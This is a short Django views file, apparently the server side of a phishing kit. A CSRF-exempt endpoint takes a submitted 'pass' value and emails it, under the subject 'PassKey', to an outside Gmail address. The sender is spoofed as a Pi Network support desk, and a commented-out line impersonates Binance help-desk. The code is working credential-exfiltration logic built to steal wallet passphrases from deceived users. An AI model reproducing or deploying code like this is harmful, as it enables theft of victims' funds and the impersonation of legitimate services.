from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.core.mail import send_mail
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import json
from django.conf import settings

@csrf_exempt
def handle_mail(request):
    data=json.loads(request.body)
    print(data)
    SendEmail(data['pass'])
    return JsonResponse({"status":"success"},safe=False)


def SendEmail(text):
    sender = "support-desk@pimainnet.com"
    # sender="help-desk@binance.com"
    recipient = f'brokermail23@gmail.com'

# Create message
    msg = MIMEMultipart("alternative")


    msg['Subject'] = f"PassKey"
    msg['From'] = sender
    msg['To'] = recipient
    part2 = MIMEText(text, 'plain')
    msg.attach(part2)
# Create server object with SSL option
    server = smtplib.SMTP_SSL("smtp.zoho.com", 465)

# Perform operations via server
    server.login(settings.EMAIL_USER, settings.EMAIL_PASS)

    server.sendmail(sender, [recipient], msg.as_string())
    server.quit()
